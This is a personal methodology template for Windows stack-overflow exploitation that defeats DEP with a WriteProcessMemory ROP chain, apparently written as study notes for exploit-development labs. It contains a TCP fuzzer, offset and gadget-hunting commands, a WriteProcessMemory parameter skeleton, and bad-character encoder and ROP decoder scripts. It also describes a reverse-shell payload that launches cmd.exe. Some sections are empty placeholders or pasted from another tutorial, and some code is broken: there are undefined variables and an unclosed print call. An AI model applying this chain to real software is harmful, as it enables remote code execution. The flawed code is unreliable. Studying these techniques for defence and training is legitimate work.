The below outlines my DEP WriteProcessMemory methodology. Some blanks that can be filled as you work through exercises and exploitation.

### 1. Program Analysis

- Ports running
- Protections of app
    
    ```python
    .load narly
    !nnmod
    ```
    
- What data or type of data is the application receiving HTTP, TCP, RPC etc.

### 2. Vuln Discovery

- [ ]  Fuzz the app
    - Type of overflow normal or SEH
    - How many bytes required for overflow
    - What gadgets do we control, do we overwrite EIP, on how many bytes?
    - [https://wiremask.eu/tools/buffer-overflow-pattern-generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator)
    
    ```python
    #!/usr/bin/python
    import socket
    import sys
    
    ######## FUZZ TCP########
    
    size = 1
    while True:
    
        size = size + 10
        inputBuffer = b"A" * size
    
        print("\nFuzzing with {} bytes".format(len(inputBuffer)))
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.10.234', 4455))
        s.send(inputBuffer)
        s.close()   
        print("\nDone!"
    ```
    
- [ ]  Analyze the crash: Identify the buffer size check the `ECX` or `EAX` registers.  Do we overwrite `EIP` as expected?
    - Are we overwriting registers?
    - Where is our buffer stores? Is it stored as DWORDs? If stored in UNICODE every character presented as WORD rather than byte, 12 bytes then become 24 byte in unicode. e.g. appends 0x00 to every character
    - How close is our buffer to `ESP`?
    - Restrictions identification
        - Partial overwrites (increase buffer size and recheck) `dds esp L10` e.g. 3 bytes `00414141`
        - Is the buffer treated as a string e.g. `AAAAAA` etc, is a null byte added?
        - Any space restrictions identified?
        - Bad characters e.g. null byte terminated `00414141` as in this example. Monitor the stack e.g. `ESP`, etc., if not crashing, can be bad chars, check mangling (`db esp - 0nSIZE`)
            
            Note uncomment each section as you move through them.. **Check bad chars twice!!**
            
            ```python
            	BADCHARS = (

- [ ]  Type of overflow e.g. basic stack (`ESP` ≠ `Buffer` and `EIP` control) or SEH
    - Types Description
        - **jump (or call)** Control EIP register via `JMP` or `CALL` —> Binary Search Tree or Unique Strings Monitor Overflow ([https://wiremask.eu/tools/buffer-overflow-pattern-generator/](https://wiremask.eu/tools/buffer-overflow-pattern-generator/))
            
            The register that points to the shellcode. With this technique, you basically use a register that contains the address where the shellcode resides and put that address in EIP. You try to find the opcode of a “jump” or “call” to that register in one of the dll’s that is loaded when the application runs. When crafting your payload, instead of overwriting EIP with an address in memory, you need to overwrite EIP with the address of the “jump to the register”. Of course, this only works if one of the available registers contains an address that points to the shellcode. This is how we managed to get our exploit to work in part 1, so I’m not going to discuss this technique in this post anymore.
            
        - **pop return** : `POP RET`If none of the registers point directly to the shellcode, but you can see an address on the stack (first, second, … address on the stack) that points to the shellcode, then you can load that value into EIP by first putting a pointer to pop ret, or pop pop ret, or pop pop pop ret (all depending on the location of where the address is found on the stack) into EIP.
        - **push return** : `PUSH RET`this method is only slightly different than the “call register” technique. If you cannot find a or opcode anywhere, you could simply put the address on the stack and then do a ret. So you basically try to find a push , followed by a ret. Find the opcode for this sequence, find an address that performs this sequence, and overwrite EIP with this address.
        - **jmp [reg + offset]** : `jmp [reg + offset]`If there is a register that points to the buffer containing the shellcode, but it does not point at the beginning of the shellcode, you can also try to find an instruction in one of the OS or application dll’s, which will add the required bytes to the register and then jumps to the register. I’ll refer to this method as jmp [reg]+[offset]
        - **blind return** : in my previous post I have explained that ESP points to the current stack position (by definition). A RET instruction will ‘pop’ the last value (4bytes) from the stack and will put that address in ESP. So if you overwrite EIP with the address that will perform a RET instruction, you will load the value stored at ESP into EIP.
        - If you are faced with the fact that the available space in the buffer (after the EIP overwrite) is limited, but you have plenty of space before overwriting EIP, then you could use **jump code** in the smaller buffer to jump to the main shellcode in the first part of the buffer.
        - **SEH** : `SEH`Every application has a default exception handler which is provided for by the OS. So even if the application itself does not use exception handling, you can try to overwrite the SEH handler with your own address and make it jump to your shellcode. Using SEH can make an exploit more reliable on various windows platforms, but it requires some more explanation before you can start abusing the SEH to write exploits. The idea behind this is that if you build an exploit that does not work on a given OS, then the payload might just crash the application (and trigger an exception).
            
            So if you can combine a “regular” exploit with a seh based exploit, then you have build a more reliable exploit. Anyways, the next part of the exploit writing tutorial series (part 3) will deal with SEH. Just remember that a typical stack based overflow, where you overwrite EIP, could potentially be subject to a SEH based exploit technique as well, giving you more stability, a larger buffer size (and overwriting EIP would trigger SEH… so it’s a win win)

- [ ]  Get precise offsets for overwrites
    
    [https://wiremask.eu/tools/buffer-overflow-pattern-generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator) 
    
    - Watch out for changing the type of crash
    - Keep it close to original crash byte size
    - If doesn’t work attempt buffer splitting e.g. `260` bytes becomes two `130` byte parts or only the last `XYZ` bytes
    
    ```python
    ALLCHAR = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai'
    
    inputBuffer = b"\x41" * 130
    inputBuffer = b"\x42" * 130
    ```
    
- [ ]  Find instructions to overwrite `EIP` with to navigate to controlled buffer space
    
    [https://defuse.ca/online-x86-assembler.htm#disassembly](https://defuse.ca/online-x86-assembler.htm#disassembly) 
    
    - Need to be static e.g. no ASLR support
    - No bad characters can be contained
    - if DEP support, JMP ESP is within `.text` code segment due to its permissions
    - null byte started addresses can be used, but will terminate after execution not allowing usage of space afterwards
    - add some NOPs afterwards
    - Sometimes `pop eax; ret` is better if you control `eax` registers etc.
    - Add jump code (P/P/R) `0xeb,0x06,0x90,0x90` to jump over SE handler
        
        ```powershell
        #Alternatives to (p/p/r)
        #Use mona SEH module
        1 pop r32 / pop r32 / ret (+ offset)
        2 pop r32 / add esp+4 / ret (+ offset)
        3 add esp+4 / pop r32 / ret (+offset)
        4 add esp+8 / ret (+offset)
        5 call dword [ebp+ or -offset]
        6 jmp dword [ebp+ or -offset]
        7 popad / push ebp / ret (+ offset)
        
        #check protections with narly, we want SafeSEH off
        .load narly
        lm m libspp
        #now search for opcodes using own script
        
        #address cannot have bad characters
        $$>a<C:\Temp\ppr-finder.wds 10000000 10226000
        
        #check the address is correct instructions
        u 1007cf53 L4
        
        #test by setting breakpoint
        bp 1007cf53
        ```
        
    - Limitation Partial EIP Control/Overwrite
        
        If our application is `null` byte terminated, our address space includes `null` byte. We can perform partial `EIP` overwrite. 
        
        We utilise the string null terminator as part of the `EIP` overwrite. Note we cannot store any data past the return address.
        
        ```python
        # Partial overwrites (increase buffer size and recheck) dds esp L10 e.g. 3 bytes 00414141 
        
        We therefore overwite only the 3 bytes e.g. 
        inputBuffer += b"\x42" * 4
        # becomes...
        inputBuffer += b"\x42\x42\x42"
        
        Will result in 00424242 result.
        
        ```

### 4. WriteProcessMemory Recap

This function will allow you to copy your shellcode to another (executable) location so you can jump to it & execute it. During the copy, WPM() will make sure the destination location is marked as writeable. You only have to make sure the target destination is executable. This function requires six parameters on the stack :

| return address | Address where WriteProcessMemory() needs to return to after it finished |
| --- | --- |
| hProcess | the handle of the current process. Should be -1 to point to the current process (Static value 0xFFFFFFFF) |
| lpBaseAddress | pointer to the location where your shellcode needs to be written to. The "return address" and "lpBaseAddress" will be the same. |
| lpBuffer | based address of your shellcode (dynamically generated, address on the stack) |
| nSize | number of bytes that need to be copied to the destination location |
| lpNumberOfBytesWritten | writeable location, where number of bytes will be written to |

```python
		# BOOL WriteProcessMemory(
    #   HANDLE  hProcess,
    #   LPVOID  lpBaseAddress,
    #   LPCVOID lpBuffer,
    #   SIZE_T  nSize,
    #   SIZE_T  *lpNumberOfBytesWritten
    # );
    #

    va  = pack("<L", (0x41414141))  # WriteProcessMemory address
    va += pack("<L", (0x42424242))  # shellcode return address to return to after WriteProcessMemory is called
    va += pack("<L", (0xffffffff))  # hProcess (pseudo Process handle)
    va += pack("<L", (0x44444444))  # lpBaseAddress (Code cave address)
    va += pack("<L", (0x45454545))  # lpBuffer (shellcode address)
    va += pack("<L", (0x46464646))  # nSize (size of shellcode)
    va += pack("<L", (0x47474747))  # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE)

```

### 5. Payload Update and Gadget Searching

We update our payload to incorporate our ROP gadgets and buffer that we will be using. We update our payload as follows:

- WPM Structure for loading parameters, with dummy values
- Offset is added to overflow the buffer
- EIP placeholder is added to control EIP overwrite
- ROP is added as placeholder for our ROP chain
- NOP padding is added before our shellcode
- Shellcode placeholder is also added

```python

## Bad chars:

```

We will now use RP++ and a custom built power-shell script to generate and sort gadgets that we can utilise. 

```python
.\rp-win-x86.exe -f C:\Users\initroot\xxxx -r 3 > gadgets.txt
```

```python

gci .\gadgets  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(mov e[a-z][a-z], esp).*?((retn  ;)|(ret  ;))"  | Select-String -Pattern "(leave)" -NotMatch
```

We also make use of an power-shell `gci` function to manually sort and filter our gadgets. For now we build a quick table that allows us to do simple things like copy between etc.

We analyse our ROP gadgets to setup backup and restore gadgets that can be used during the exploit process.

### 6. Stack Prep

We need to find the stack address of our current dummy registers, this can be done by using the value in `ESP`. We can’t modify `ESP` as it will point to the next gadget, however, we can copy it to another register. The following ways can be used to obtain a copy of the `ESP` register. Important to ensure we are carried towards our next ROP chain values else execution will not continue.

```python
mov XXX, XXX; ret
xchg XXX, XXX; ret
pop XXX; mov XXX, XXX; ret
lea XXX, [XXX]; ret
```

We look for gadgets, we rely on a mix of our sorted ROP gadget output file and performing manual searching using ***gci*** command pointed to our ROPS folder. In the below example, we look for `PUSH ESP` gadgets. As a reminder our bad chars are: XXXXX.

```python

```

We update our payload as follow:

```python

```

The above will do the following:

- XX
- XX

Now we need to resolve our `WriteProcessMemory` address dynamically.

### 7. Resolving WPM Address

We need to obtain the location of our `WriteProcessMemory` from the Import Address Table (IAT) table. The Import Address Table (IAT) is a crucial part of the Windows Portable Executable (PE) format used to manage dynamic linking of libraries. When a program calls a function from a dynamically linked library, it references the function's entry in the IAT. 

Considering we cannot copy the executable we will be using WinDBG to obtain the address.

1. List loaded modules and note their base address `lm`.
    
    ```python
    
    ```
    
2. Dump the header from the dll your interested in `!dh <module> –f`.
    
    ```python
    
    ```
    
3. From the output from `!dh` look for the the “Import Address Table Directory”. 
    
    ```python
    
    ```
    
4. Use the `d` command to dump the address at that offset and try to resolve them to symbols e.g. `dps 00000000+X000`
    
    ```python
    
    ```
    

From the above we can identify that our `WriteProcessMemoryStub` is located at: XXXXXX. Now we need to do the following.

- Obtain address on stack where the dummy DWORD is e.g. dummy `WriteProcessMemory` address
- resolve the address of `WriteProcessMemory` e.g. fetch the correct address
- Write that value to top of the placeholder value e.g. patch the chain to point to `WriteProcessMemory`

```python
dds XXXXXX
```

We update our payload and set everything to identify if our dummy addresses are pushes correctly before we proceed.

```python

```

As we are pushing `0x45454545` onto the stack as a dummy value, we want to identify where on the stack our dummy address is as shown below. We step through the instructions until the very last chain event and then calculate the offset. 

```python

? eax - XXXXX  

dd XXXXX  

```

From the above we learn that we need to move `0xXX` bytes from `ESP` e.g. `ESP - 0xXX` to reach our `WriteProcessMemory` dummy Address. Because we control `ESP`, we looking at where our example landed. Since we have a copy of the original `ESP` in the `EAX` register, we need to make some adjustments to move backwards from `ESP`. We ideally need gadgets like:

```python
SUB EAX, XXXXXX
RETN
```

Since we can't find the gadget, we have reached a pitfall and need to get a bit more creative. 

```python
gci .\gadgets  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(sub eax).*?((retn  ;)|(ret  ;))"
###no results###
```

Excellent, XXX register points to our WPM prototype and our first address resolves the WPM memory location successfully. We have successfully patched the address of `WriteProcessMemory` at runtime. Before we proceed further we ensure we make a copy of our ESP into another register. 

### 8. Patching WPM Parameters

### Codecave Hunting

 Let’s recap our overall exploit structure, we will need to copy our shellcode to the codecave. 

[offset] —> [writeprocessmemory] —> [eip] —> [rop] —> [shellcode]

We now need to patch in the address where WriteProcessMemory() needs to return to after it finished. Before we can proceed we need to identify the codecave where we can copy our shellcode to. The requirements would be that we should utilise a memory location with *Execute* permissions. We first check the location where our shellcode is currently residing in. We will also need to dynamically resolve the address and can potentially utilise a pivot to jump to our shellcode. 

```python

0:004> !dh processname

SECTION HEADER #1
   .text name
    **1E39 virtual size
    1000 virtual address**
    2000 size of raw data

0:004> dd processname + **virtualSize** + virtualAddress 

0:004> !vprot address
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        00001000
State:             00001000  MEM_COMMIT
Protect:           00000020  PAGE_EXECUTE_READ
Type:              01000000  MEM_IMAGE

```

Perfect it seems we have found a spot for our shellcode in the *.text* section with *EXECUTE* permissions. Further calculations show we have around XXX bytes for our shellcode. We therefor proceed with our shellcode location as XXXX. 

### Shellcode Return Address

Now that we have our shellcode location, we can proceed in writing the location into the dummy address. We update our WPM as follows:

```python
va  = pack("<L", (0x41414141))  # WriteProcessMemory address
va += pack("<L", (0x42424242))  # shellcode return address to return to after WriteProcessMemory is called
va += pack("<L", (0xffffffff))  # hProcess (pseudo Process handle)
va += pack("<L", (0x44444444))  # lpBaseAddress (Code cave address)
va += pack("<L", (0x45454545))  # lpBuffer (shellcode address)
va += pack("<L", (0x46464646))  # nSize (size of shellcode)
va += pack("<L", (0x47474747))  # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE)
```

### hProcess

We don’t have to do much for the `hProcess` as the parameter should point to the current process, which in our instance would then be `0xFFFFFFFF` which we already hardcoded. The `handle` parameter is quite easy to fill - we can even use a static value. According to Microsoft Docs, `[GetCurrentProcess()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess)` returns a handle to the current process. More specifically, it returns a “*pseudo handle*” to the current process. A pseudo handle, denoted by -1 or `0xFFFFFFFF`, is “*special*” constant that refers to a handle to the current process. This means, whenever a Windows API function requests a handle (*generally in user mode*), passing `0xFFFFFFFF` will tell the API in question to utilize a handle to the current process. Since we would like to write our shellcode to memory within the process space - passing `0xFFFFFFFF` to the `kernel32!WriteProcessMemory` function call will tell the function we would like to write the memory to virtual memory within the current process space.

```python
#WriteProcessMemory 
va  = pack("<L", (0x45454545)) # dummy WriteProcessMemory Address
va += pack("<L", (0x42424242)) # Shellcode Return Address 0x42424242 where our codecave in the .text area exist
**va += pack("<L", (0xFFFFFFFF)) # hProccess = handle to current process (Pseudo handle = 0xFFFFFFFF points to current process)**
va += pack("<L", (0x44444444)) # lpBaseAddress Code cave address 0x44444444 where our codecave in the .text area exist
va += pack("<L", (0x49494949)) # # dummy lpBuffer (stack address)
va += pack("<L", (0x51515151)) # dummy nSize
va += pack("<L", (0x41414141)) # lpNumberOfBytesWritten
```

### lpBaseAddress

The `lpBaseAddress` should be equal to our shellcode address e.g. codecave. We update our WPM structure as follow replacing the `0x44444444` with `0xxxxxxxxx`.

```python
#WriteProcessMemory 
va  = pack("<L", (0x45454545)) # dummy WriteProcessMemory Address
va += pack("<L", (0x42424242)) # Shellcode Return Address 0x42424242 where our codecave in the .text area exist
va += pack("<L", (0xFFFFFFFF)) # hProccess = handle to current process (Pseudo handle = 0xFFFFFFFF points to current process)
**va += pack("<L", (**0x44444444**)) # lpBaseAddress Code cave address** 0x44444444 **where our codecave in the .text area exist**
va += pack("<L", (0x49494949)) # # dummy lpBuffer (stack address)
va += pack("<L", (0x51515151)) # dummy nSize
va += pack("<L", (0x41414141)) # lpNumberOfBytesWritten
```

### lpBuffer

The `lpBuffer` will be a pointer to our shellcode (********************************************which first needs to be written to the stack********************************************). We will resolve this dynamically with ROP gadgets. Let’s dive in. Recall that `kernel32!WriteProcessMemory` will take in a source buffer and write it somewhere else. 

Since we have control of the stack, we will just preemptively place our shellcode there. Let’s recap which values we have in the registers. 

```python

```

We will need to extract the value the memory address pointing to by using an arbitrary write primitive. When we get the address of the `lpBuffer` into a register, we will then not overwrite the register but rather utilise something like `dword ptr [reg]` which will force the address onto the stack to point to something like `0x49494949`. **Remember - every time the process is terminated and restarted - the virtual memory on the stack changes. This is why we need to dynamically resolve this parameter, instead of hardcoding an address.**

```python

```

We see that everything works as expected and we successfully have our `lpBuffer` written.

### nSize

Next up we have the `nSize` value. The value should be the number of bytes written e.g. size of the shellcode + NOPs in most instances. For this specifically we would like to utilise at least `0x180` bytes (384 decimal). For this we continue with our shellcode where we increase the `X` register to align with the buffer location WriteProcessMemory. 

```python

```

### lpNumberOfBytesWritten

We don’t require to use the gadget so we just simply zero it out. `lpNumberOfBytesWritten` is an optional argument that can be set to null. You could provide a pointer to a variable that will receive the number of bytes transferred by WPM but this is not needed here.

```python

```

Perfect we have successfully written all the parameters for WPM, and next we need to call `kernel32!WriteProcessMemory`.

### 9. Executing WPM

We should now execute our WPM as the stack has been successfully setup. By now we should be `0x20` bytes away from our WPM Prototype’s first parameter which points to `kernel32!WriteProcessMemory`. We search for gadgets that will decrease the registers we control. 

```bash

```

We adjust our exploit as follows:

```bash

```

A final check before we attempt to execute WPM is to check if our `lpBuffer` is correctly sized still given the changes in our ROP exploit.  We check that our WPM is invoked and that the parameters are setup correctly. We set a breakpoint and once WPM is started we check ESP.

```python
0:004> p
KERNEL32!WriteProcessMemoryStub:
XXXXXXXX 8bff            mov     edi,edi
0:004> dds esp 
```

Next we check if the shellcode is copied, so we dump the contents of our codecave before and after execution.

```python
u XXXXXX
```

Our parameters seem to have been set correctly and we continue execution to confirm that our shellcode is copied. Keep in mind that our shellcode is currently represented by the `0xcc` instructions. The following checks are per-
formed:

- The is not mangled before WPM executes.
- The codecave is large enough and empty before WPM execution.
- The codecave is filled with our payload after WPM execution.
- The codecave contains our full shellcode with nothing mangled.

If we experience issues with the shellcode being mangled, this is usually due to the space between WPM (VA) and our shellcode. 

- Increase the gap between WPM and our shellcode so that the WPM execution doesn’t mangle our shellcode
- Attempt to identify if our shellcode is potentially stored in another place in memory that is not mangled

    The shellcode effectively does the following:
    
    - Resolve kernel32 using the PEB method
    - Resolve the address for *TerminateProcess*(0x78b5b983), *LoadLibraryA*(0xec0e4e8e) and *CreateProcessA*(0x16b3fe72) within kernel32.
    - Loads w2_32 using *loadLibraryA*
    - Resolves the address for *WSAStartup*(0x3bfcedcb), *WSASocketA*(0xadf509d9) and *WSAConnect*(0xb32dba0c) within w2_32.
    - Next we call setup the stack to call WSAStartup which initiates the use of the Winsock DLL by a process
    - The calling of *WSASocketA* will create the socket.
    - Finally calling *WSAConnect* establishes the connection for us.
    - We finally call *CreateProcessA* followed by *TerminateProcess*.
    - To ensure we can call *CreateProcessA* we need to setup the *LPSTARTUPINFO* structure, therefor it’s executed beforehand followed by the *create_cmd_string* which will setup our cmd.exe parameter that must be run.

- Troubleshooting
    
    Items to check if shellcode doesn’t execute:
    
    - Enough space between WPM and shellcode?
    - Is ESP close to EIP when execution starts?
    - Does subtracting a value from ESP help?
    - Is ESP dividable by 4?
- Automated ROP Encoding
    
    In order for our DEP evasion mechanism to function correctly, it's necessary to incorporate the decoding process directly within the ROP chain, thereby creating a ROP decoder. As we, and our shellcode, won't be granted write permissions following the transfer of the shellcode into the code cave via WPM, it's imperative that the decoding takes place prior to the invocation of WPM.
    
    We will utilise a simple technique that subtract a value from our bad characters for example, while doing this, keep track of the indices of the bad characters, so we can restore them later during run time. Let’s recap our bad chars: `\x00\x20`. The below table outlines the process. When restoring our characters we want to add a value to it.
    
    | Bad Char | EncodedChar | DecodeChartoAdd |
    | --- | --- | --- |
    | 0x20 | 0x1F | 0x01 |
    | 0x00 | 0xFF | 0x01 |
    
    The initial step involves identifying all the undesirable characters within the shellcode. The following Python script can assist in accomplishing this (*Note: In case of a different binary or memory region, make the necessary adjustments to the 'badchars' variable*).
    
    ```python
    def mapBadChars(sh):
        BADCHARS = b"\x00\x20" 
        print(str(sh))
        i= 0
        badIndex = []
        while i < len(sh):
                for c in BADCHARS:
                    if sh[i] == c:
                        badIndex.append(i)
                i=i+1
        return badIndex
    ```
    
    We can encode our shellcode using the following python code, which effectively replaces the bad chars with our new values as per the table summary. 
    
    ```python
    def encodeShellcode(shellcode):
        badchars = bytearray(b"\x00\x20")
        encodedchars = bytearray(b"\xff\x1f")
        encodedShellcode = shellcode
        for i in range(len(badchars)):
            encodedShellcode = encodedShellcode.replace(pack("B", badchars[i]), pack("B", encodedchars[i]))
        return encodedShellcode
    ```
    
    Next we need to incorporate the above into our shellcode and write our decoder. We require a pointer to our encoded shellcode, a perfect location is between the patching of the `LPBUFFER` and `NSIZE` location. 
    
    For our decoding routine which will take two arguments as input. Initially, we'll prepare a list of potential bad characters and their respective replacement characters. Then, we'll establish an accumulator variable (named restoreRop) that will hold the entire decoding ROP chain.
    
    Following this, we'll execute a loop over all the indices of the bad characters. For every entry, we'll compute the offset from the last bad character to the current one. We'll then negate this offset, assign it to the variable `neg_offset`, and utilize it in the ROP chain. To ascertain the value to be added to the substitute character, we'll implement an inner loop over all potential bad characters to identify which one exists at the corresponding index. Once located, this value is stored in the variable named `value`.
    
    As the content of `value` needs to be popped into BL|AL|BH, it should be left-shifted by 8 bits. This action results in a value that aligns with the AL|BH register but also includes NULL bytes. To counteract the NULL byte issue, we'll carry out an OR operation with a static value of `0x11110011`. Ultimately, this outcome is inscribed into the ROP chain where it will be popped into another register during execution.
    
    This intricate procedure facilitates custom encoding. Moreover, it enables us to decode the shellcode prior to its transfer to the non-writable code cave.
    
    ```python
    # AL register = 0x11111100 (value = value | 0x11110011)
    # BH register = 0x11110011 (value = (value << 8) | 0x11110011)
    
    def decodeShellcode(badIndex, shellcode):
        badchars = bytearray(b"\x00\x20")
        addencodedchars = bytearray(b"\x01\x01")
        restoreRop = b""
        for i in range(len(badIndex)):
            if i == 0:
                offset = badIndex[i]
            else:
                offset = badIndex[i] - badIndex[i-1]
            neg_offset = (-offset) & 0xffffffff
    
            value = None
            for j in range(len(badchars)):
                if shellcode[badIndex[i]] == badchars[j]:
                    value = encodedchars[j]
                    value = (value << 8) | 0x11110011
    
            restoreRop += pack("<L", (0xFFFFFFFF)) # POP VALUE
            restoreRop += pack("<L", (neg_offset)) # offset to the next bad char
            restoreRop += pack("<L", (0xFFFFFFFF)) # SUB OFFSET
            restoreRop += pack("<L", (0xFFFFFFFF)) # POP VALUE
            restoreRop += pack("<L", (value)) # values in AL
            restoreRop += pack("<L", (0xFFFFFFFF)) # add byte [ecx], al ; ret ;
    
        return restoreRop
    ```
    
    Given that a pointer to the shellcode located on the stack is necessary for its modification (or decoding), the optimal position to install the decoding process would be subsequent to the alteration of the `lpBuffer` argument. We will need to continue adjusting our offset for our shellcode set during `LPBUFFER` as our ROP changes to ensure we land within our NOP slides. 
    
    ```python
    [....]
    
    ########### ROP ENCODER ###########
    ## Bad chars:  \0x00\x0d\x20\x2b\x3d\x5e
    shellc = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe"
    
    pos = mapBadChars(shellc)
    rop += decodeShellcode(pos, shellc)
    
    #Restore WPM prototype buffer for nSize patching
    
    ## NSIZE
    #adjust eax to align with nsize e.g. increase eax 0x04
    rop += pack("<L", (0xFFFFFFFF)) # inc eax ; ret  ; 
    rop += pack("<L", (0xFFFFFFFF)) # inc eax ; ret  ;
    [....]
    
    #####################
    ## NOP & Shellcode ##
    #####################
    # NOP Padding before shellcode, adjust as needed
    encodedShellcode = encode(shellcode)
    [....]
    ```
    
    Before we identify potential ROP gadgets for the decoding process, we recap our register values where our ROP Encoder are set to start.
    
    ```python
    
    ```
    
    | Register | Value | Description |
    | --- | --- | --- |
    | EAX |  |  |
    | EBX |  |  |
    | ECX |  |  |
    | EDX |  |  |
    | ESI |  |  |
    | EDI |  |  |
    | EBP |  |  |
    
    We effectively need to do the following now:
    
    - XXX points to our shellcode location
    - pop the offset of our current or next bad char into a register
    - subtract the negative offset
    - pop the value for our OR instruction into register
    - add lower sub register to our bad char
    
    ```python
    
    ```
    
    ```python
    
    gci .\rops\  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(add byte).*?((retn  ;)|(ret  ;))"
    
    gci .\rops\  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(sub).*?((retn  ;)|(ret  ;))"
    
    ```
    
    We update our shellcode as shown below. Next we step through the instructions to see if our encoder works.
    
    ```python
    	  
    ```
    
    Next we need to restore our registers once our ROP decoder is completed. The address for WPM is currently within `ESI`.
    
    ```python
    
    ```
    
    We run our payload as next we need to adjust our `lpBuffer` again by searching for our NOP slide then calculating the difference.
    
    ```bash
    
    ```
